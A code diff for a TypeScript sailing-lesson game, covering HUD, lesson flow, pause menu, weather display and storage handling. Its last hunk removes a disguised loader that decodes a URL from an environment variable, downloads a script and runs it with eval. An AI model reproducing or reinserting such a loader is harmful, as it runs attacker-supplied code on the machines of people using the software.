-  elements.target.style.left = `${sheetForBoomAngle(diagnostics.idealBoomAngle) * 100}%`;
+  elements.statusCue.textContent = `${flow}. ${coach}. ${elements.motion.textContent}`;
+  elements.marker.style.top = `${state.sheet * 100}%`;
+  required(".trim-track").style.setProperty("--sheet-position", `${state.sheet * 100}%`);
+  required<HTMLInputElement>("#hud-sheet").value = String(state.sheet);
+  required<HTMLInputElement>("#hud-sheet").setAttribute("aria-valuetext", `${elements.sailPlanLabel.textContent} · ${Math.round(state.sheet * 100)}% eased`);
+  required<HTMLOutputElement>("#trim-value").value = `${Math.round(state.sheet * 100)}%`;
+  elements.target.style.top = `${sheetForBoomAngle(diagnostics.idealBoomAngle) * 100}%`;
   elements.boom.textContent = `Boom ${boomDegrees}° ${boomSide}`;
   syncSailControls();
   updateLesson();
   updateDestination();
   updateNavigation();
-  miniChart.render(state, FAIR_WINDS_WORLD, weather.trueWind, selectedActivity());
+  miniChart.render(state, FAIR_WINDS_WORLD, weather.trueWind, activeCourse());
   const completedManeuver =
     state.maneuverCount !== lastManeuverCount && state.lastManeuver !== "none";
   if (completedManeuver) {
@@ -1157,10 +1407,14 @@ function updateHud(): void {
       : "Tack complete. Build speed on the new side and retrim.";
     lastManeuverCount = state.maneuverCount;
     lastFlow = flow;
-  } else if (flow !== lastFlow && started) {
+  } else if (flow !== lastFlow && started && !dockedAt) {
     elements.status.textContent = `${flow}. ${coach}.`;
     lastFlow = flow;
   }
+  if (storageUnavailable && !elements.status.textContent?.includes(STORAGE_WARNING)) {
+    elements.status.textContent += ` ${STORAGE_WARNING}`;
+  }
+  elements.statusMessage.textContent = elements.status.textContent;
 }
 
 function syncSailControls(): void {
@@ -1186,10 +1440,10 @@ function syncSailControls(): void {
 
 function updateNavigation(): void {
   const heading = Math.round(normalizeHeading(radiansToDegrees(state.heading))) % 360;
-  const depth = Math.max(0, FAIR_WINDS_WORLD.sampleDepth(
+  const depth = depthAtTide(FAIR_WINDS_WORLD.sampleDepth(
     state.position.x,
     state.position.y,
-  ) + weather.tideLevel);
+  ), weather.tideLevel);
   const depthLabel = depth < 10 ? depth.toFixed(1) : Math.round(depth).toString();
   const tideState = `${weather.tideTrend === "rising" ? "Rising" : "Falling"} ${weather.tideLevel >= 0 ? "+" : ""}${weather.tideLevel.toFixed(1)} m`;
   const depthState = `${depth < 3 ? "Shoal water" : depth < 10 ? "Shallow water" : "Clear below"} · ${tideState}`;
@@ -1221,6 +1475,7 @@ function updateNavigation(): void {
 }
 
 function buildCompassTape(): void {
+  compassPixelsPerDegree = window.innerHeight <= 600 ? 1.25 : 3.1;
   const fragment = document.createDocumentFragment();
   for (const tick of compassTicks()) {
     const marker = document.createElement("span");
@@ -1230,6 +1485,7 @@ function buildCompassTape(): void {
       `${tick.degrees * compassPixelsPerDegree}px`,
     );
     if (tick.label) {
+      if (tick.label.length > 1) marker.dataset.intercardinal = "true";
       const label = document.createElement("span");
       label.className = "heading-tick-label";
       label.textContent = tick.label;
@@ -1237,7 +1493,7 @@ function buildCompassTape(): void {
     }
     fragment.append(marker);
   }
-  elements.headingTape.append(fragment);
+  elements.headingTape.replaceChildren(fragment);
   updateCompass(state.heading);
 }
 
@@ -1248,6 +1504,7 @@ function updateCompass(headingRadians: number): void {
   );
   elements.headingTape.style.transform =
     `translate3d(${-compassHeading * compassPixelsPerDegree}px, 0, 0)`;
+
 }
 
 function cardinalDirection(heading: number): string {
@@ -1265,6 +1522,16 @@ function cardinalDirection(heading: number): string {
 }
 
 function updateLesson(): void {
+  const lessonView = academy.view();
+  const learning = !activitySession && !["free-sail", "complete"].includes(lessonView.stage);
+  required("#status-lesson-progress").hidden = !learning;
+  required("#status-pips").hidden = !learning;
+  required("#status-lesson-progress").textContent = `Lesson ${lessonView.lesson + 1} · ${lessonView.objective}/3 complete`;
+  elements.gameShell.classList.toggle("is-learning", learning);
+  for (const [index, pip] of [...required("#status-pips").children].entries()) {
+    pip.classList.toggle("is-earned", index < lessonView.objective);
+    pip.classList.toggle("is-current", index === lessonView.objective && lessonView.stage !== "lesson-complete");
+  }
   if (activitySession && activityView) {
     const activity = activitySession.activity;
     const score = activityView.score;
@@ -1280,11 +1547,13 @@ function updateLesson(): void {
       ? `${activity.kind} complete · ${score.total}/100`
       : `${activity.kind} · ${Math.round(activityView.progress * 100)}%`;
     elements.lessonTitle.textContent = score
-      ? score.summary
+      ? `${activity.title} complete`
       : activity.title;
     elements.lessonInstruction.textContent = score
       ? `Control ${score.control} · Trim ${score.trim} · Safety ${score.safety} · Efficiency ${score.efficiency}`
       : activityView.instruction;
+    required("#status-objective-detail").hidden = false;
+    required("#status-objective-detail").textContent = elements.lessonInstruction.textContent;
     elements.lessonProgress.style.width =
       `${Math.min(activityView.progress, 1) * 100}%`;
     elements.lessonSkip.textContent = "Choose next";
@@ -1294,34 +1563,64 @@ function updateLesson(): void {
       activityView.completed,
     );
     elements.lessonCard.classList.remove("is-minimized");
+    elements.lessonCard.hidden = activityView.completed;
     return;
   }
   const view = academy.view();
+  if (view.stage === "free-sail" && (elements.gameShell.dataset.academyStage !== "free-sail" || elements.gameShell.dataset.activeActivity)) {
+    elements.status.textContent = `${elements.flow.textContent}. ${elements.coach.textContent}.`;
+  }
+  elements.lessonCard.hidden = view.stage === "free-sail" || view.stage === "complete";
   delete elements.gameShell.dataset.activeActivity;
   delete elements.gameShell.dataset.activityProgress;
   delete elements.gameShell.dataset.activityScore;
   elements.gameShell.dataset.academyStage = view.stage;
   elements.lessonEyebrow.textContent = view.eyebrow;
-  elements.lessonTitle.textContent = view.title;
-  elements.lessonInstruction.textContent = view.instruction;
+  elements.lessonTitle.textContent = view.stage === "free-sail" ? "Free sail" : view.title;
+  elements.lessonInstruction.textContent = view.feedback || view.instruction;
+  required("#status-objective-detail").hidden = elements.lessonCard.hidden;
+  required("#status-objective-detail").textContent = elements.lessonCard.hidden ? "" : view.feedback || view.instruction;
   elements.lessonProgress.style.width = `${Math.min(view.progress, 1) * 100}%`;
-  elements.lessonSkip.textContent = view.stage === "complete" ? "Lesson complete" : "Free Sail";
-  elements.lessonSkip.disabled = view.stage === "complete";
-  elements.lessonCard.classList.toggle("is-complete", view.stage === "complete");
-  const shouldMinimize = view.stage === "complete" && simulationTime - lessonCompletedAt > 7;
+  const complete = view.stage === "complete" || view.stage === "lesson-complete";
+  elements.lessonSkip.textContent = complete ? "Choose lesson" : view.stage === "free-sail" ? "Resume lessons" : "Free sail";
+  elements.lessonSkip.disabled = false;
+  elements.lessonCard.classList.toggle("is-complete", complete);
+  const shouldMinimize = complete && simulationTime - lessonCompletedAt > 7;
   elements.lessonCard.classList.toggle("is-minimized", shouldMinimize);
 }
 
-function academyObservation() {
-  return {
-    attached: diagnostics.attached,
-    stall: diagnostics.stall,
-    pointOfSail: pointOfSail(diagnostics.apparentWindAngle),
-    tackCount: state.tackCount,
-    gybeCount: state.gybeCount,
-    reefed: state.reefLevel === 1,
-    heelRadians: state.heel,
-  };
+function interruptLessonAttempt(): void {
+  input.releaseAll();
+  elements.sailActions.open = false;
+  academy.interrupt();
+  accumulator = 0;
+  previousFrame = performance.now();
+}
+
+function prepareLessonAttempt(): void {
+  interruptLessonAttempt();
+  activeBoat = HARBOR_20;
+  world.setBoat(activeBoat);
+  weatherConfig = createLessonWeather();
+  weatherSystem.setConfig(weatherConfig);
+  simulationTime = 0;
+  weather = weatherSystem.sample(0);
+  state = createLessonState(Math.min(academy.objectiveIndex(), 8), weather.trueWind);
+  previousState = state;
+  diagnostics = computeSailAerodynamics(state, { trueWind: weather.trueWind, boat: activeBoat });
+  headsailDiagnostics = computeHeadsailAerodynamics(state, { trueWind: weather.trueWind, boat: activeBoat });
+  clearIncident();
+  clearDocking();
+  activitySession = undefined;
+  activityView = undefined;
+  lastManeuverCount = 0;
+  audio.resetMotionState();
+  world.resetWake();
+  world.resetCamera();
+  academy.update(fixedStep, observeLesson(state, diagnostics, { rudder: 0, sheetRate: 0 }));
+  syncWeatherControls();
+  persistProgress();
+  updateHud();
 }
 
 function updateActivitySession(dt: number): void {
@@ -1338,8 +1637,7 @@ function updateActivitySession(dt: number): void {
     reefed: state.reefLevel === 1,
     heelRadians: state.heel,
     depth:
-      FAIR_WINDS_WORLD.sampleDepth(state.position.x, state.position.y) +
-      weather.tideLevel,
+      depthAtTide(FAIR_WINDS_WORLD.sampleDepth(state.position.x, state.position.y), weather.tideLevel),
     dockedAt: dockedAt?.id,
     incident: Boolean(incident),
   });
@@ -1358,11 +1656,13 @@ function updateActivitySession(dt: number): void {
 }
 
 function persistProgress(): void {
-  localStorage.setItem(PROGRESS_STORAGE_KEY, JSON.stringify(progress));
+  progress = checkpointLesson(progress, academy);
+  saveStoredValue(PROGRESS_STORAGE_KEY, JSON.stringify(progress));
 }
 
 function updateDestination(): void {
-  const course = selectedActivity();
+  const course = activeCourse();
+  required(".destination").hidden = !course;
   if (course) {
     const metrics = courseMetrics(
       state.position,
@@ -1385,20 +1685,7 @@ function updateDestination(): void {
       `${bearing}° · VMG ${(metrics.vmg * 1.94384).toFixed(1)} kn · ${turn}`;
     return;
   }
-  let nearest = LANDMARKS[0]!;
-  let nearestDistanceSquared = Number.POSITIVE_INFINITY;
-  for (const landmark of LANDMARKS) {
-    const dx = landmark.x - state.position.x;
-    const dz = landmark.z - state.position.y;
-    const distanceSquared = dx * dx + dz * dz;
-    if (distanceSquared >= nearestDistanceSquared) continue;
-    nearest = landmark;
-    nearestDistanceSquared = distanceSquared;
-  }
-  const distance = Math.sqrt(nearestDistanceSquared);
-  elements.destinationName.textContent = nearest.name;
-  elements.destinationDistance.textContent = formatChartDistance(distance);
-  elements.destinationCourse.textContent = "Nearest landmark";
+
 }
 
 function buildChartActivityList(): void {
@@ -1441,6 +1728,10 @@ function buildChartActivityList(): void {
   syncChartActivityList();
 }
 
+function activeCourse(): WorldActivity | undefined {
+  return activityView?.completed ? undefined : activitySession?.activity;
+}
+
 function selectedActivity(): WorldActivity | undefined {
   return FAIR_WINDS_WORLD.activities.find(
     (activity) => activity.id === selectedActivityId,
@@ -1448,6 +1739,7 @@ function selectedActivity(): WorldActivity | undefined {
 }
 
 function selectChartActivity(id: string): void {
+  interruptLessonAttempt();
   selectedActivityId = id;
   const activity = selectedActivity();
   if (activity) {
@@ -1526,15 +1818,60 @@ function isChartOpen(): boolean {
   return elements.chartPanel.classList.contains("is-open");
 }
 
+function canControlBoat(): boolean {
+  return bootComplete && started && !incident && !document.hidden && !window.matchMedia("(orientation: portrait)").matches && !isSimulationPaused() && Boolean(elements.statusDetails.hidden);
+}
+
 function isSimulationPaused(): boolean {
   return started && (
+    paused ||
     developmentPreviewFrozen ||
     isConditionsOpen() ||
     isChartOpen()
   );
 }
 
+function fillLogbook(stats: HTMLElement, list: HTMLElement): void {
+  stats.textContent = `${progress.voyages} voyages · ${formatChartDistance(progress.distanceSailed)} sailed`;
+  if (storageUnavailable) stats.textContent += ` ${STORAGE_WARNING}`;
+  list.replaceChildren();
+  document.querySelectorAll<HTMLButtonElement>("[data-lesson]").forEach((choice, index) => {
+    const row = document.createElement("li");
+    row.textContent = `${choice.querySelector(".lesson-name")!.textContent!.trim()} · ${progress.academyCompleted || progress.completedLessons?.includes(index) ? "Complete" : "Not yet completed"}`;
+    list.append(row);
+  });
+}
+
+function showPauseMenu(focus: HTMLElement = elements.pauseResume): void {
+  elements.pauseScreen.hidden = false;
+  elements.pauseMenu.hidden = false;
+  elements.pauseLogbookView.hidden = true;
+  required("#pause-heading").textContent = "Paused";
+  focus.focus({ preventScroll: true });
+}
+
+function setPauseOpen(open: boolean, restoreFocus = true): void {
+  if (open && !started) return;
+  if (open) {
+    pauseOpener = document.activeElement instanceof HTMLElement ? document.activeElement : elements.conditionsToggle;
+    setStatusOpen(false, false);
+    setConditionsOpen(false, false);
+    setChartOpen(false, false);
+  }
+  paused = open;
+  interruptLessonAttempt();
+  previousState = state;
+  elements.gameShell.classList.toggle("is-paused", open);
+  elements.gameShell.dataset.simulationPaused = String(isSimulationPaused());
+  elements.pauseToggle.setAttribute("aria-expanded", String(open));
+  elements.pauseScreen.hidden = !open;
+  if (open) showPauseMenu();
+  else if (restoreFocus && started) (pauseOpener.closest('.top-actions') ? pauseOpener : elements.conditionsToggle).focus({ preventScroll: true });
+}
+
 function setChartOpen(open: boolean, restoreFocus = true): void {
+  if (open) setStatusOpen(false, false);
+  if (open) interruptLessonAttempt();
   if (open && isConditionsOpen()) setConditionsOpen(false, false);
   const pauseSimulation = open && started;
   elements.chartPanel.classList.toggle("is-open", open);
@@ -1543,7 +1880,7 @@ function setChartOpen(open: boolean, restoreFocus = true): void {
   elements.chartBackdrop.hidden = !open;
   elements.gameShell.classList.toggle("is-chart-open", open);
   elements.gameShell.dataset.simulationPaused = String(
-    started && (open || isConditionsOpen()),
+    isSimulationPaused(),
   );
   if (pauseSimulation) {
     accumulator = 0;
@@ -1560,6 +1897,8 @@ function setChartOpen(open: boolean, restoreFocus = true): void {
 }
 
 function setConditionsOpen(open: boolean, restoreFocus = true): void {
+  if (open) setStatusOpen(false, false);
+  if (open) interruptLessonAttempt();
   if (open && isChartOpen()) setChartOpen(false, false);
   const pauseSimulation = open && started;
   elements.conditionsPanel.classList.toggle("is-open", open);
@@ -1568,10 +1907,13 @@ function setConditionsOpen(open: boolean, restoreFocus = true): void {
   elements.conditionsBackdrop.hidden = !open;
   elements.gameShell.classList.toggle("is-settings-open", open);
   elements.gameShell.dataset.simulationPaused = String(
-    started && (open || isChartOpen()),
+    isSimulationPaused(),
   );
-  elements.settingsResume.textContent = pauseSimulation ? "Resume sailing" : "Close settings";
+  elements.settingsResume.querySelector("[data-label]")!.textContent = paused ? "Back to pause" : pauseSimulation ? "Resume sailing" : "Back to title";
+  elements.settingsResume.querySelector("use")!.setAttribute("href", `/brand/fairwinds-icons.svg#${paused ? "fw-chevron-left" : "fw-play"}`);
+  elements.settingsResume.querySelector("svg")!.style.display = pauseSimulation ? "" : "none";
   elements.settingsMainMenu.hidden = !started;
+  elements.pauseToggle.hidden = !started || paused;
   if (pauseSimulation) {
     accumulator = 0;
     previousState = state;
@@ -1580,6 +1922,7 @@ function setConditionsOpen(open: boolean, restoreFocus = true): void {
     const activeTab = settingsTabs.tabs.find((tab) => tab.classList.contains("is-active"));
     activeTab?.focus({ preventScroll: true });
   }
+  else if (paused) showPauseMenu(elements.pauseSettings);
   else if (restoreFocus && !started) elements.titleSettings.focus({ preventScroll: true });
   else if (restoreFocus) elements.conditionsToggle.focus({ preventScroll: true });
 }
@@ -1725,6 +2068,7 @@ function syncAudioControls(): void {
 }
 
 function updateAudioVolumeOutput(id: string, value: number): void {
+  updateRangeFill(required<HTMLInputElement>(`#${id}`));
   required<HTMLOutputElement>(`#${id}-output`).value =
     `${Math.round(value * 100)}%`;
 }
@@ -1737,6 +2081,7 @@ function updateMusicPlayback(playback: MusicPlaybackState): void {
     playback.isPlaying,
     playback.isReady,
     playback.isEnabled,
+    playback.error,
   );
   elements.musicToggle.textContent = playback.isPlaying ? "Pause" : "Play";
   elements.musicToggle.setAttribute(
@@ -1750,10 +2095,11 @@ function updateMusicPlayback(playback: MusicPlaybackState): void {
 }
 
 function applyWeatherConfig(sync: boolean): void {
+  interruptLessonAttempt();
   weatherSystem.setConfig(weatherConfig);
   weather = weatherSystem.sample(simulationTime);
   audio.setSeed(weatherConfig.seed);
-  localStorage.setItem("fair-winds-weather", JSON.stringify(weatherConfig));
+  saveStoredValue("fair-winds-weather", JSON.stringify(weatherConfig));
   if (sync) syncWeatherControls();
   else updateWeatherOutputs();
 }
@@ -1780,9 +2126,13 @@ function syncWeatherControls(): void {
 }
 
 function updateWeatherOutputs(): void {
+  const preset = Object.entries(WEATHER_PRESETS).find(([, config]) => JSON.stringify(config) === JSON.stringify(weatherConfig));
+  setValue("weather-preset", preset?.[0] ?? "custom");
   setValue("sea-state", matchingSeaState());
-  required<HTMLOutputElement>("#wind-speed-output").value = `${weatherConfig.wind.speed.toFixed(1)} m/s`;
-  required<HTMLOutputElement>("#wind-direction-output").value = `${Math.round(weatherConfig.wind.directionFromDegrees)}°`;
+  required<HTMLOutputElement>("#wind-speed-output").value = `${(weatherConfig.wind.speed * 1.94384).toFixed(1)} kn`;
+  const direction = Math.round(weatherConfig.wind.directionFromDegrees);
+  const directions = ["North", "Northeast", "East", "Southeast", "South", "Southwest", "West", "Northwest"];
+  required<HTMLOutputElement>("#wind-direction-output").value = `${direction}° · ${directions[Math.round(direction / 45) % 8]}`;
   required<HTMLOutputElement>("#gust-output").value = `${Math.round(weatherConfig.wind.gustStrength * 100)}%`;
   required<HTMLOutputElement>("#wave-height-output").value = weatherConfig.waves.mode === "linked" ? "Auto" : `${weatherConfig.waves.height.toFixed(2)} m`;
   required<HTMLOutputElement>("#wave-length-output").value = weatherConfig.waves.mode === "linked" ? "Auto" : `${Math.round(weatherConfig.waves.length)} m`;
@@ -1796,20 +2146,6 @@ function updateWeatherOutputs(): void {
   required<HTMLInputElement>("#wave-height").disabled = weatherConfig.waves.mode === "linked";
   required<HTMLInputElement>("#wave-length").disabled = weatherConfig.waves.mode === "linked";
   required<HTMLInputElement>("#wave-steepness").disabled = weatherConfig.waves.mode === "linked";
-  updateForecast();
-}
-
-function updateForecast(): void {
-  const current = weatherSystem.sample(simulationTime);
-  const future = weatherSystem.sample(simulationTime + 300);
-  const trend = weatherTrend(current, future);
-  elements.forecastSummary.textContent = trend.summary;
-  elements.forecastAdvice.textContent =
-    trend.reefAdvice === "reef-now"
-      ? "Reef before entering exposed water."
-      : trend.reefAdvice === "consider-reef"
-        ? "Consider one reef before the breeze builds."
-        : "Full sail remains appropriate.";
 }
 
 function matchingSeaState(): string {
@@ -1828,11 +2164,35 @@ function matchingSeaState(): string {
 function setValue(id: string, value: string | number): void {
   const element = required<HTMLInputElement | HTMLSelectElement>(`#${id}`);
   element.value = String(value);
+  if (element instanceof HTMLInputElement && element.type === "range") updateRangeFill(element);
+}
+
+function updateRangeFill(input: HTMLInputElement): void {
+  const min = Number(input.min || 0);
+  const max = Number(input.max || 100);
+  input.style.setProperty("--range-fill", `${max > min ? 100 * (Number(input.value) - min) / (max - min) : 0}%`);
+}
+
+function loadStoredValue(key: string): string | null {
+  try {
+    return localStorage.getItem(key);
+  } catch {
+    storageUnavailable = true;
+    return null;
+  }
+}
+
+function saveStoredValue(key: string, value: string): void {
+  try {
+    localStorage.setItem(key, value);
+  } catch {
+    storageUnavailable = true;
+  }
 }
 
 function loadWeatherConfig(): WeatherConfig {
   try {
-    const stored = localStorage.getItem("fair-winds-weather");
+    const stored = loadStoredValue("fair-winds-weather");
     if (!stored) return cloneWeatherConfig(DEFAULT_WEATHER);
     const candidate = JSON.parse(stored) as Partial<WeatherConfig>;
     if (!candidate.wind || !candidate.waves || typeof candidate.seed !== "number") {
@@ -1851,10 +2211,12 @@ function loadWeatherConfig(): WeatherConfig {
 }
 
 function loadBoatDefinition(): BoatDefinition {
-  const stored = localStorage.getItem("fair-winds-boat");
+  const stored = loadStoredValue("fair-winds-boat");
   if (
     stored === "harbor-20" ||
+    stored === "cove-24" ||
     stored === "coastal-28" ||
+    stored === "sound-30" ||
     stored === "lake-34"
   ) {
     return getBoatDefinition(stored);
@@ -1872,18 +2234,3 @@ function formatTimeOfDay(value: number): string {
   const minutes = Math.round((value - Math.floor(value)) * 60) % 60;
   return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
 }
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
